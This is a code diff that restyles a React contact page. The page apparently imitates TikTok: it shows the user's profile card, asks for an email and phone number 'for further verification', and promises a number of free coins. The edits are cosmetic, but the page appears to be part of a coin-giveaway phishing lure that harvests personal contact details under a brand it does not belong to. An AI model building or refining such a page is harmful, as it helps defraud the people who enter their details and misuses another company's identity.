@@ -87,28 +87,33 @@ const ContactPage = () => {
       </header>
 
       {/* Main Content */}
-      <main className="max-w-4xl mx-auto px-6 py-12">
+      <main className="max-w-4xl mx-auto px-6 py-6">
         {/* Title */}
-        <div className="text-center mb-12">
-          <h1 className="text-6xl font-black mb-4">
+        <div className="text-center mb-6">
+          <h1 className="text-4xl font-black mb-2">
             <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
               TikTok
             </span>
           </h1>
-          <p className="text-cyan-400 text-2xl font-semibold">Your Contact Information</p>
+          <p className="text-cyan-400 text-lg font-semibold">Your Contact Information</p>
         </div>
 
-        {/* Profile Card Inline Yapısı */}
+        {/* Profile Card Container */}
         <div className="w-[400px] h-[100px] mx-auto mb-8 border border-cyan-400/30 rounded-2xl shadow-[0_0_20px_rgba(34,211,238,0.2)] bg-[#0f0f10] flex p-3 gap-3 overflow-hidden">
           {tiktokData ? (
             <>
+              {/* Profil Fotoğrafı (Sol) */}
               <img src={tiktokData.avatar} alt="Profile" className="w-16 h-16 rounded-full border border-cyan-400 object-cover mt-0.5" />
+              
+              {/* Sağ Bilgi Alanı */}
               <div className="flex flex-col flex-1 h-full justify-between py-1">
+                {/* İsim (Beyaz/Kalın) ve Kullanıcı Adı (Mavi/@ ile) */}
                 <div className="flex flex-col leading-tight">
-                  {/* Name verisi buraya geldi */}
-                  <h2 className="text-white text-md font-bold">{tiktokData.name || tiktokData.username}</h2>
-                  <span className="text-cyan-400 text-sm mt-0.5">@{tiktokData.username}</span>
+                  <h2 className="text-white font-bold text-lg">{tiktokData.name}</h2>
+                  <span className="text-cyan-400 text-sm font-medium mt-0.5">@{tiktokData.username}</span>
                 </div>
+                
+                {/* İstatistikler (Alt) */}
                 <div className="flex justify-between w-full pr-4 pb-0.5">
                   <div className="flex flex-col items-center">
                     <span className="text-white font-bold text-sm">{tiktokData.followers}</span>
@@ -131,20 +136,20 @@ const ContactPage = () => {
         </div>
 
         {/* Instructions */}
-        <p className="text-gray-400 text-center text-lg mb-8">
+        <p className="text-gray-400 text-center text-base mb-7">
           Please provide your email and phone number for further verification.
         </p>
 
         {/* Email Input */}
-        <div className="mb-6">
-          <label className="text-white text-lg mb-3 block">Email Address</label>
+        <div className="mb-5">
+          <label className="text-white text-base mb-2 block">Email Address</label>
           <div className="relative">
             <Input
               type="email"
               placeholder="example@email.com"
               value={email}
               onChange={handleEmailChange}
-              className={`w-full bg-[#1a1a1c] border-2 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:ring-1 pr-12 transition-all ${
+              className={`w-full bg-[#1a1a1c] border-2 text-white placeholder:text-gray-500 px-4 py-5 text-lg rounded-lg focus:ring-1 pr-12 transition-all ${
                 email && isEmailValid 
                   ? 'border-green-500 focus:border-green-500 focus:ring-green-500' 
                   : email && !isEmailValid
@@ -154,37 +159,29 @@ const ContactPage = () => {
             />
             {email && isEmailValid && (
               <div className="absolute right-4 top-1/2 -translate-y-1/2">
-                <div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center animate-pulse">
-                  <span className="text-white text-xl font-bold">✓</span>
+                <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center animate-pulse">
+                  <span className="text-white text-sm font-bold">✓</span>
                 </div>
               </div>
             )}
             {email && !isEmailValid && (
               <div className="absolute right-4 top-1/2 -translate-y-1/2">
-                <div className="w-8 h-8 rounded-full bg-red-500 flex items-center justify-center">
-                  <span className="text-white text-xl font-bold">✗</span>
+                <div className="w-6 h-6 rounded-full bg-red-500 flex items-center justify-center">
+                  <span className="text-white text-sm font-bold">✗</span>
                 </div>
               </div>
             )}
           </div>
-          {email && !isEmailValid && (
-            <p className="text-red-400 text-sm mt-2">Please enter a valid email (xxxx@xxxxx.xxxx)</p>
-          )}
-          {email && isEmailValid && (
-            <p className="text-green-400 text-sm mt-2 flex items-center gap-2">
-              <span className="text-green-500">✓</span> Valid email format
-            </p>
-          )}
         </div>
 
         {/* Phone Input */}
-        <div className="mb-8">
-          <label className="text-white text-lg mb-3 block">Phone Number</label>
+        <div className="mb-6">
+          <label className="text-white text-base mb-2 block">Phone Number</label>
           <div className="flex gap-3">
             <select
               value={countryCode}
               onChange={(e) => setCountryCode(e.target.value)}
-              className="bg-[#1a1a1c] border border-gray-700 text-white px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
+              className="bg-[#1a1a1c] border border-gray-700 text-white px-3 py-5 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
             >
               <option value="+1">+1</option>
               <option value="+44">+44</option>
@@ -229,7 +226,7 @@ const ContactPage = () => {
               placeholder="+1 xxx xxx xxxx"
               value={phone}
               onChange={(e) => setPhone(e.target.value)}
-              className="flex-1 bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-6 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
+              className="flex-1 bg-[#1a1a1c] border border-gray-700 text-white placeholder:text-gray-500 px-4 py-5 text-lg rounded-lg focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400"
             />
           </div>
         </div>
@@ -238,17 +235,17 @@ const ContactPage = () => {
         <Button
           onClick={handleSubmit}
           disabled={!email.trim() || !phone.trim() || !isEmailValid}
-          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#f73157] hover:to-[#f73157] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+          className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#f73157] hover:to-[#f73157] text-gray-400 hover:text-white font-semibold py-5 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
         >
           Continue
         </Button>
 
         {/* Coins Display */}
-        <div className="mt-8 text-center">
-          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
-            <span className="text-gray-400 text-lg">You will receive: </span>
-            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
-            <span className="text-gray-400 text-lg"> Coins</span>
+        <div className="mt-6 text-center">
+          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-6 py-3">
+            <span className="text-gray-400 text-base">You will receive: </span>
+            <span className="text-cyan-400 text-xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
+            <span className="text-gray-400 text-base"> Coins</span>
           </div>
         </div>
       </main>
